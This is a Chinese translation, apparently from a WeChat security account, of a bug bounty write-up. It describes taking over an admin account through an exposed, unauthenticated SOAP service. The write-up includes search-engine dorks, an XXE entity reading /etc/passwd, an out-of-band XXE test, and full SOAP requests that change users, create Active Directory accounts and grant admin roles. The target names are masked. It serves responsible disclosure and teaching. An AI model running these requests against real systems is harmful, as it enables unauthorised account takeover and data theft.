> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247486886&idx=1&sn=be075071b89d614263149e7ac7ab9ecb

#  从SOAP到Shell：利用SOAP服务实现完全管理员账户接管（近乎RCE的漏洞）  
原创 安全小白团译文  安全小白团   2025-06-20 00:31  
  
forever young  
  
  
  
不论昨天如何，都希望新的一天里，我们大家都能成为更好的人，也希望我们都是走向幸福的那些人  
  
  
  
01  
  
背景  
  
安全小白团  
  
  
说到现代Web技术，SOAP（简单对象访问协议）可能不会是你首先想到的。它是一种较旧的协议，在当今的应用中往往被REST、GraphQL和gRPC所掩盖。然而，正因为它是遗留技术，它也是一个被忽视的攻击面——对漏洞猎人来说，这是一座隐藏的金矿。  
  
  
最近，我读到一篇讨论SOAP系统漏洞的博客文章，这激起了我的兴趣。我决定深入研究基于SOAP的攻击面，结果发现了一些令人惊讶的东西。  
  
  
在通过FOFA和Shodan扫描暴露的SOAP服务时，我偶然发现了一个不寻常的目标：一家知名会计软件公司的服务器将其SOAP WSDL（Web服务描述语言）完全无认证地暴露在公网上。本文将带你了解这一小发现如何几乎演变成可公开访问的 SOAP 服务上的全面远程代码执行 (RCE) 漏洞。  
  
  
  
02  
  
步骤一：通过深度搜索发现目标  
  
安全小白团  
  
  
如前所述，在重燃对SOAP漏洞的兴趣后，我决定进一步探索。虽然SOAP并未完全“消亡”，但它主要存在于老旧系统或因技术限制无法更新的系统中。除非出于兼容性需求，现代应用更倾向于使用更现代的协议。由于这种转变，开发者常常忽视SOAP配置，从而增加了发现安全漏洞的可能性。  
  
  
为了展开搜索，我精心设计了一些与SOAP相关的查询，专门用于Shodan、FOFA和我们最爱的Google Dork等深度搜索引擎。我特别关注可能配置错误的服务器，例如暴露Apache CXF默认服务列表页面的服务器。  
  
  
原因在于：CXF服务列表绝不应暴露在互联网上。在安全的环境中，它们应仅限内部访问。公开暴露会带来一系列安全风险。  
  
  
Apache CXF服务列表是Apache CXF的一个功能，后者是一个流行的开源框架，用于在Java中构建SOAP和REST Web服务。  
  
  
借助ChatGPT，我编写了几个查询，以下是部分示例：  
  

```
body=&#34;soap:Envelope&#34; 
header=&#34;Content-Type: text/xml&#34; 
protocol=&#34;soap&#34; 
body=&#34;soapAction&#34; 
http.headers.content-type:&#34;application/soap+xml&#34; 
http.html:&#34;wsdl:definitions&#34; 
product:&#34;Microsoft SOAP Toolkit&#34; 
product:&#34;Apache Axis&#34;
```

  
通过结合Dork和筛选器，我发现了多个实例。我将结果复制到Excel文件中，并按IP、服务、域名、国家等属性排序。随后，我进行了IPWhois查询，并再次使用FOFA识别组织。  
  
  
大多数目标要么非常老旧，要么属于普通组织，因此用处不大。然而，经过约30分钟的分析，一个目标的组织名称引起了我的注意——简单地通过浏览器访问它，就让我走上了一条异常有趣的道路。  
  
  
打开URL后，我发现了一个公开可访问的CXF服务列表页面，这是暴露SOAP接口的典型标志，更令人兴奋的是它还暴露了Apache JBossWS服务端点——它在线且公开。更棒的是，它提供了完整的CXF服务列表，列出了可调用的操作。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHdsxCPiaia1lCXEibERCvBZN3cumtfyicrAhGUiax1pCxZejPucAm2Y4ad2g/640?wx_fmt=png&from=appmsg "")  
  
  
这是一个经典的CXF服务页面，列出了多个可用的SOAP服务，例如：  
  

```
getA**In****o
sendDocument
getxxxxxxxResponse
searchxxxxxx
FormResponsexxxxxx
getHeartBeat
getMessageTraffic
getMonitorVersion
Ann**l****Modi****
Con*********e
Mod********y
InsertInActiveDirectory
Elimina*****ActiveDirectory
Res**Email
id****
```

  
请注意：我已修改部分服务名称，以避免泄露目标信息。  
  
  
  
03  
  
步骤二：初步侦察——发现端点  
  
安全小白团  
  
  
访问端点https://target.com/jbossws/services返回了一个HTML页面，列出了服务绑定及其WSDL链接。典型的配置错误。  
  
  
通过以下命令访问WSDL：  
  

```
curl-k https://target.com/***/*******wsdl
```

  
返回了一个详细的XML定义，包含数百个操作（如下图所示），无需认证、令牌或标头。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHTba3wGdGXfCFMuibxkerUGU5FXGHEeJ4TfnibugQVUZmYOA1OZ9Dqmzg/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
步骤三：通过信息泄露和早期XXE线索进行枚举  
  
安全小白团  
  
  
在获得无认证SOAP方法的访问权限后，我的首要目标是枚举内部用户并确认后端交互。  
  
  
发现敏感用户信息  
  
  
由于存在读取用户邮箱、用户名等方法，我开始测试Re***Email方法，使用以下SOAP POST请求：  
  

```
POST /***/****/****/**finance_users/ HTTP/1.1 
Host: target.com 
Content-Type: text/xml; charset=utf-8
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelopexmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;xmlns:web=&#34;http://***.***/&#34;>
 <soapenv:Header/>
 <soapenv:Body>
  <web:Re***Email>
   <id***>242</id***>
 </web:Re***Email>
 </soapenv:Body>
</soapenv:Envelope>
```

  
响应确认，即使是任意ID（如242），如果用户存在，也会返回有效数据：  
  

```
HTTP/1.1 200 OK 
Date: Fri, 25 Apr 2025 12:27:49 GMT 
Server: Apache 
X-Frame-Options: SAMEORIGIN 
X-Powered-By: *** 
Content-Type: text/xml;charset=UTF-8 
***** 
X-XSS-Protection: 1; mode=block 
X-Content-Type-Options: nosniff 
Content-Security-Policy: default-src 'self' 
X-Content-Security-Policy: default-src 'self' 
X-WebKit-CSP: default-src 'self' 
Content-Length: 271


<env:Envelopexmlns:env='http://schemas.xmlsoap.org/soap/envelope/'><env:Header></env:Header><env:Body><**:**exmlns:ns2=&#34;http://**.**/&#34;><return>**@***</return></**:***Email**></env:Body></env:Envelope>
```

  
类似的请求使用ReadUserName揭示了内部用户名——注意ID1 = Admin：  
  

```
POST /**/***/*** HTTP/1.1
Host: sub.domain.main-domain.com
Content-Type: text/xml; charset=utf-8
Content-Length: 337
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:web=&#34;http://***.***/&#34;>
  <soapenv:Header/>
  <soapenv:Body>
    <web:ReadUserName>
      <id***>1</id***>
    </web:ReadUserName>
  </soapenv:Body>
</soapenv:Envelope>
```

  
因此，确认上述请求允许我枚举用户、验证有效ID并获取邮箱地址——完全无需认证。  
  
XXE可能性线索  
  
  
在注意到简单SOAP方法无需认证即可运行后，我开始好奇——后端使用的是什么XML解析器？  
  
  
我设计了一个经典的XXE载荷来测试本地文件读取能力。在I***Nome函数使用的sName字段中，我注入了：  
  

```
<!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;>
```

  
结果很有趣，该请求产生了SOAP错误，响应中包含以下字符串：  
  

```
<faultstring>\etc \ hostname </faultstring>
```

  
虽然没有显示内容，但文件名本身被回显。这是XML解析器处理DTD但不返回内容的典型行为。换句话说：解析器接受了XXE载荷，但由于捕获块或严格的SOAP错误处理而未回显文件内容。无论如何，这足以确认XXE行为可能存在。  
  
  
深入：通过DNS验证XXE盲注  
  
  
为了进一步确认，我尝试通过DNS进行带外XXE（OOB-XXE）。我注册了一个Burp Collaborator并注入以下载荷：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHZzhw2nfP5oeUosicUNqpiad68kf3TgIrwx9oNdL9sO4edut5NBCL1bRw/640?wx_fmt=png&from=appmsg "")  
  
  
几秒钟后……  
  
  
Boom——Burp Collaborator收到了请求。后端尝试获取恶意DTD，确认XXE盲注确实可行。  
  
  
这一步至关重要。它告诉我后端Java服务存在以下问题：  
  
- 解析XML时未禁用外部实体加载。  
  
- 即使未直接返回文件内容，仍执行DTD引用。  
  
- 易受带外交互方法（如DNS或HTTP回调）攻击。  
  
从这一刻起，攻击范围从简单的枚举扩展到可能的权限提升、账户接管，甚至尝试RCE。  
  
  
  
05  
  
步骤四：从枚举到利用——接管管理员账户  
  
安全小白团  
  
  
确认可以枚举内部用户数据并验证XXE后，是时候测试漏洞的深度了。  
  
  
真正的目标是什么？看看能否在无需认证的情况下修改用户或创建新账户。  
  
  
1. 通过I***Email操纵邮箱  
  
  
我开始与I***Email函数交互。该方法允许设置或修改任何用户账户的邮箱。无需令牌、会话，纯SOAP逻辑。  
  

```
POST /***/**/** HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
Content-Length: 401
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:web=&#34;http://**.**/&#34;>
  <soapenv:Header/>
  <soapenv:Body>
    <web:I***Email>
      <id***>999</id***>
      <***Email>nc5@intigriti.me</***Email>
      <tokenWebLogon></tokenWebLogon>
    </web:Imp***Email>
  </soapenv:Body>
</soapenv:Envelope>
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHJvE1v7aVX84smxyThZILKB2NCLlibxzpciaeJqVAkiajAFOBItbM9U3dA/640?wx_fmt=png&from=appmsg "")  
  
  
响应？  
  

```
<return>true</return>
```

  
2. 通过SetUserName篡改用户名  
  
  
设置邮箱后，下一步是设置用户名——一个对身份至关重要的参数。使用SetUserName，我为目标ID设置了一个干净的用户名。  
  

```
<web:SetUserName>
  <id***e>999</id***e>
  <s***e>admin_takeover</s**e>
  <tokenWebLogon></tokenWebLogon>
</web:ImpostaNomeUtente>
```

  
再次确认成功。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHa8yMlh8YGqo0r5pcwu3I8ejAickab5ndlNPKX0yib9Ff21IVibrQKSTeA/640?wx_fmt=png&from=appmsg "")  
  
  
现在，我完全控制了一个用户账户，拥有系统中有效的用户名和邮箱地址，且全程无需任何形式的认证。  
  
  
  
06  
  
步骤五：通过Active Directory操作实现权限提升  
  
安全小白团  
  
  
拥有有效用户后，我们尝试提升其权限。在WSDL中发现了几个可能有用的操作：  
  

```
Modi***ActiveDirectory
SynchronizeSID
SetProfessionalFunctions
```

  
1. ModificaInActiveDirectory  
  
  
此方法似乎用于在AD中创建用户，带有***Crea***=true标志。我针对用户ID（999）测试并收到确认。  
  

```
POST /**/**/** HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
Content-Length: 397
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:web=&#34;http://**.**/&#34;>
  <soapenv:Header/>
  <soapenv:Body>
    <web:Mo***ActiveDirectory>
  <id**>999</id**>
  <**Cr**>true</**bC**>
  <tokenWebLogon></tokenWebLogon>
</web:Mo***ActiveDirectory>
  </soapenv:Body>
</soapenv:Envelope>
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHghoRVkAIMjAgjULx8larHd635nwNbFYDXqA9IyM8w8NibWGTcs9DXwQ/640?wx_fmt=png&from=appmsg "")  
  
  
服  
务器响应：  
  

```
<return>true</return>
```

  
意味着后端确认并可能在Active Directory中注册了我的用户（ID: 999）。  
  
  
2. 通过SetProfessionalFunctions分配权限  
  
  
这是真正的胜利。该函数接受用户ID和角色ID列表（iFun**1到iFun**4）。我们将所有角色ID设为1，模拟完全管理员权限。  
  

```
POST /***/***/*** HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
Content-Length: 465
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:web=&#34;http://**.**/&#34;>
  <soapenv:Header/>
  <soapenv:Body>
    <web:I***li>
  <i**>999</***>
  <i**>1</i**>
  <i**>1</i**>
  <i**3>1</i**3>
  <i**>1</i**4>
</web:I***i>
  </soapenv:Body>
</soapenv:Envelope>
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHvZTib3V7bFhgMmtW8yV98wGTQEcia1vUQqicVz5xu3lYhHLCKbV6TF8jw/640?wx_fmt=png&from=appmsg "")  
  
  
响应？——是的，再次true，且值得注意的是，我们的用户现在正式拥有特权。  
  
  
3. 通过SynchronizeSID完成SID同步  
  
  
最后，我触发了SID同步，通常用于在企业环境中在系统之间传播用户属性。  
  

```
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:web=&#34;http://**.***/&#34;>
  <soapenv:Header/>
  <soapenv:Body>
 <web:SynchronizeSID>
  <sUserName>admin_***</sUserName>
  <tokenWebLogon></tokenWebLogon>
</web:SynchronizeSID>
  </soapenv:Body>
</soapenv:Envelope>
```

  
后端再次积  
极  
响应。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaASKxS11kaR4rCIXQnMOxLIs9MxuvRwHkibfjZC1pDWaOKrfdjib2yibowhv3mfMkHabGrN48RlTpkPJylO2sZ2mw/640?wx_fmt=other&from=appmsg "")  
  
  
至此，我已在系统中创建了一个完全特权的用户账户，操纵其属性，并完成了跨目录服务的同步——全程无需认证。  
  
  
成功创建完全特权用户后，我报告了漏洞。在报告中，我询问是否需要进一步证明或执行额外步骤以展示潜在升级路径（包括RCE），但项目方迅速回应，确认漏洞。他们明确要求不再进一步操作，认为报告已被接受——并标记为严重。  
  
  
无需再深入。  
  
  
  
  
06  
  
步骤六：清理与恢复  
  
安全小白团  
  
  
作为负责任的研究人员，我们应始终采取措施将系统恢复到原始状态：  
  
- 使用SetUsername和SetEmail恢复原始管理员用户名和邮箱。  
  
- 从Active Directory中删除测试用户。  
  
- 记录所有流量并捕获所有测试用例的截图。  
  
撰写本文时，该端点已加固，现在任何访问尝试均需通过公司SSO系统认证。  
  
  
影响总结  
  
- 未经身份验证的WSDL访问：攻击者可自由探索所有内部操作。  
  
- 敏感信息泄露：无需登录即可获取邮箱、用户名和系统元数据。  
  
- 账户劫持：通过篡改邮箱和用户名可劫持任何账户。  
  
- 权限提升：可任意分配管理员功能。  
  
- Active Directory同步：无需认证即可进行完整的AD交互。  
  
- XXE ：通过DNS确认XXE盲注。  
  
- SOAP未死。  
  
- 老旧系统=高额漏洞赏金潜力。  
  
- 暴露的WSDL可导致完全入侵。  
  
- XXE盲注仍真实存在。  
  
参考及来源：  
  
https://infosecwriteups.com/from-soap-to-shell-exploiting-legacy-soap-services-for-full-admin-account-takeover-and-nearly-5355009044c3  
  
  
07  
  
免责&版权声明  
  
安全小白团  
  
  
  
安全小白团是帮助用户了解信息安全技术、安全漏洞相关信息的微信公众号。安全小白团提供的程序(方法)可能带有攻击性，仅供安全研究与教学之用，用户  
将其信息做其他用途，由用户承担全部法律及连带责任，安全小白团不承担任何法律及连带责任。安全小白团所分享的工具均来自互联网公开资源，我们不对工具的来源进行任何形式的担保或保证。  
用户在下载或使用本公众号分享的工具前，应自行评估工具的安全性。我们无法对工具可能存在的病毒、木马或其他恶意软件负责，因此造成的任何损失，安全小白团不承担任何责任。  
欢迎大家转载，  
转载请注明出处。  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaic181R2RnYicpic6GbdiazMpqiaIrCaa2fbjKHtn8kiayKGGBeW0icqgpfzNqmibShxqsn2DMDggpaxnKjrY1sCWZXWng/640?wx_fmt=png "")  
  
转发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ItKicuUNQ9EMVAsW4tKUASR3dbCFrBib4ibY05IeDzhxf9b1KMxjzLaukAYt0NfYLchE5eibmaSHibiamfT9wDQibytww/640?wx_fmt=png "")  
  
收藏  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jwUk1NOJTytvIJd6VYGIIp4cA0qNKtMv7tAziatxhK4whicjTxAPklWUEfjejWvRbEbJjKDoRhZpUaPaEibpFYbcQ/640?wx_fmt=png "")  
  
点赞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/K2CMDET8V6nLGsmoNxVfZytJuZzowIia6LuVg70JTa2jGiaozMwyvhG9eKOKVa5rzaj1QOgfPm4a2lsEJ7GN7zCQ/640?wx_fmt=png "")  
  
在看  
  
  
